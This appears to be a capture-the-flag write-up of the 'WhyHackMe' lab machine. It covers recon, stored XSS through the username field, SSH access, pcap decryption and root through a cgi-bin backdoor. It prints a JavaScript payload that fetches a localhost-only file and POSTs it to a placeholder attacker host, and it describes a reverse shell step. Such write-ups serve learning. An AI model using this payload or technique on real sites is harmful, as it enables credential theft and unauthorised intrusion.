---
title: "Whyhackme"
date: 2026-01-09T21:56:47+00:00
draft: false
categories: [""]
tags: []
---



---

### 1. Initial Reconnaissance: Peering into the Target's Open Doors

My first step in understanding the target was a rapid `rustscan` to quickly identify any open network ports. This initial sweep revealed three critical services listening on the host:

-   **Port 21**: Typically associated with FTP (File Transfer Protocol).
-   **Port 22**: The standard port for SSH (Secure Shell).
-   **Port 80**: Indicating an HTTP (Hypertext Transfer Protocol) web server.

![](/images/Pasted%20image%2020260109151508.png)

To gather more specific information about these services, including their versions, I performed a more in-depth `nmap` scan.

![](/images/Pasted%20image%2020260109151629.png)

The `nmap` results confirmed my suspicions, identifying an FTP server, an SSH service, and an HTTP web server,  Apache, running on the respective ports.

---

### 2. Enumeration: Uncovering Hidden Paths

With the open ports and services identified, the next phase involved a deeper dive into each service to uncover potential vulnerabilities or information leaks.

#### FTP Server: A Clue in Plain Sight

I began by exploring the FTP server on port 21. A successful login using default credentials ( anonymous) granted me access.

![](/images/Pasted%20image%2020260109152558.png)

Within the FTP directory, a file named `update.txt` immediately caught my attention. Its contents were a significant find, disclosing that a user named `mike` had been compromised and, more importantly, provided a URL to access new credentials: `127.0.0.1/dir/pass.txt`. This pointed me directly towards the web server for further investigation.

#### HTTP Web Server: The Blog and the Backdoor's Breadcrumbs

Navigating to the target's IP address in a web browser, I encountered a static webpage.

![](/images/Pasted%20image%2020260109152909.png)

A quick inspection of the page's source code, while not immediately revealing, did highlight a reference to `blog.php`.

![](/images/Pasted%20image%2020260109152924.png)

Visiting `blog.php` led me to a blog page, which, in turn, contained another link, this time to a login page.

![](/images/Pasted%20image%2020260109153620.png)
![](/images/Pasted%20image%2020260109153638.png)
![](/images/Pasted%20image%2020260109153719.png)

Attempts to log in with common or default credentials proved unsuccessful. This prompted a search for other accessible web pages.

Employing fuzzing techniques to discover hidden directories and pages with `.php` extensions, I uncovered a `registration.php` page.

![](/images/Pasted%20image%2020260109181006.png)

Accessing this page presented a form allowing me to create a new user account by providing a desired username and password.

![](/images/Pasted%20image%2020260109181031.png)
![](/images/Pasted%20image%2020260109181217.png)

Upon successfully creating an account, I gained the ability to post comments on the blog.

![](/images/Pasted%20image%2020260109181531.png)

---

### 3. Exploitation: Leveraging Stored XSS for Credential Exfiltration

The newly discovered comment functionality seemed like a prime candidate for web vulnerabilities. I systematically tested various common web exploits, but none of my initial attempts yielded any results.

![](/images/Pasted%20image%2020260109183547.png)

However, recalling the information from `update.txt` – specifically, the statement that the file was "only accessible by localhost (127.0.0.1), so nobody else can view it except for me or people with access to the common account" – sparked a new idea. This strongly suggested that the admin user would be viewing the blog from `localhost`. This is a critical condition for a Stored Cross-Site Scripting (XSS) attack.

My hypothesis was to inject a malicious JavaScript payload not into the comment body, but into the username field during registration. If the username was displayed on the blog page, and the admin viewed it, the script would execute from the admin's `localhost` context.

I tested this theory by registering with a simple XSS payload as the username.

![](/images/Pasted%20image%2020260109184540.png)

The test was successful, confirming the presence of a Stored XSS vulnerability.

Now, my objective was to craft a payload that would retrieve the `pass.txt` file (located at `http://127.0.0.1/dir/pass.txt` as per `update.txt`) and exfiltrate its contents to my attacker machine. While my browser would block a direct request to `127.0.0.1` due to the Same-Origin Policy, the admin's browser, being on `localhost`, would not.

The malicious JavaScript payload was designed to fetch the content of `http://127.0.0.1/dir/pass.txt` and then `POST` it to a listener on my attacker machine:

```js
<script>fetch("http://127.0.0.1/dir/pass.txt").then(x => x.text()).then(y => fetch("http://<ATTACKER_IP>:<ATTACKER_PORT>", {method: "POST", body:y}));</script>
```

Before registering with this payload (using my attacker IP and a chosen port), I set up a `netcat` listener on my machine to capture the incoming data.

![](/images/Pasted%20image%2020260109195514.png)

After registering a new user with the XSS payload as the username and posting a comment, I waited. Within a short period, my `netcat` listener received a callback, delivering the credentials from `pass.txt`. The credentials were `jack:WhyIsMyPasswordSoStrongIDK`.

---

### 4. Gaining User Access: SSH Login

With the `jack:WhyIsMyPasswordSoStrongIDK` credentials successfully exfiltrated, I proceeded to attempt an SSH login to the target machine.

![](/images/Pasted%20image%2020260109200204.png)

The login was successful, granting me a shell as the `jack` user. A quick check confirmed the presence of the user flag, marking a significant milestone in my compromise.

![](/images/Pasted%20image%2020260109201746.png)
![](/images/Pasted%20image%2020260109202105.png)

---

### 5. Privilege Escalation: Unraveling the Root Backdoor

With user access established, my next objective was to escalate privileges to `root`.

#### Initial Enumeration: The `urgent.txt` Clue

After executing `linpeas`, a script designed to enumerate potential privilege escalation vectors, I discovered files named `urgent.txt` and capture.pcap files.

![](/images/Pasted%20image%2020260109202554.png)

The content of `urgent.txt` was highly informative. It described a security incident where files within the `/cgi-bin` directory could not be removed, even by the root user. This suggested a deeper, persistent issue or misconfiguration.

![](/images/Pasted%20image%2020260109203038.png)

I confirmed this observation by attempting to remove a file in `/cgi-bin`, encountering the same inability to change directory into it.

#### Network Analysis: The Mysterious Port 41312 and Encrypted Traffic

Further investigation, specifically examining the `iptables` rules, revealed an inbound connection rule for port `41312`.

![](/images/Pasted%20image%2020260109204319.png)

This unusual port warranted closer inspection. The files in /opt also mentioned a `pcap` file, which I downloaded to my local machine for analysis.

![](/images/Pasted%20image%2020260109204911.png)

An initial attempt to connect to port `41312` directly from the target machine resulted in a "Bad Request" error.

![](/images/Pasted%20image%2020260109205449.png)
![](/images/Pasted%20image%2020260109205943.png)

Visiting the webpage on port `41312` confirmed that the resources required a TLS certificate, indicating encrypted communication.

![](/images/Pasted%20image%2020260109205650.png)

To decrypt the `pcap` file in Wireshark, I needed the corresponding TLS certificate. Given the web server was Apache, I searched common Apache certificate locations and found `/etc/apache2/certs/apache-certificate.crt`.

![](/images/Pasted%20image%2020260109210645.png)
![](/images/Pasted%20image%2020260109211341.png)

I downloaded this key to my local machine.

![](/images/Pasted%20image%2020260109211714.png)

In Wireshark, I imported the key into the TLS protocol settings to enable decryption of the captured traffic.

![](/images/Pasted%20image%2020260109212038.png)

With the traffic decrypted, filtering by HTTP requests immediately exposed the attacker's activity: a `GET` request to `/cgi-bin/`  containing a command embedded in the query string. This clearly indicated an attempt on command execution.

![](/images/Pasted%20image%2020260109212303.png)
![](/images/Pasted%20image%2020260109212447.png)

#### Achieving Root: Exploiting the `cgi-bin` Backdoor

The decrypted `pcap` file revealed the root cause of the `/cgi-bin` issue mentioned in `urgent.txt`: a persistent backdoor allowing arbitrary command execution. I crafted my own reverse shell payload, mirroring the attacker's technique, but configured to connect back to my listener.

![](/images/Pasted%20image%2020260109212933.png)

I then URL-encoded this payload to ensure it was correctly interpreted when sent as part of an HTTP request.

![](/images/Pasted%20image%2020260109213009.png)

With a `netcat` listener active on my machine, I sent the crafted `GET` request to `/cgi-bin/` with my URL-encoded payload.

Almost instantly, I received a reverse shell connection, granting me access as the `www-data` user.

![](/images/Pasted%20image%2020260109213135.png)

A crucial step in privilege escalation is checking `sudo` permissions. Running `sudo -l` revealed that the `www-data` user could execute `ALL` commands as `ALL` users without requiring a password.

This meant a straightforward path to root:

```bash
sudo su
```

With this command, I successfully switched to the `root` user and was able to retrieve the final flag, completing the compromise of the "WhyHackMe" target.

![](/images/Pasted%20image%2020260109213455.png)

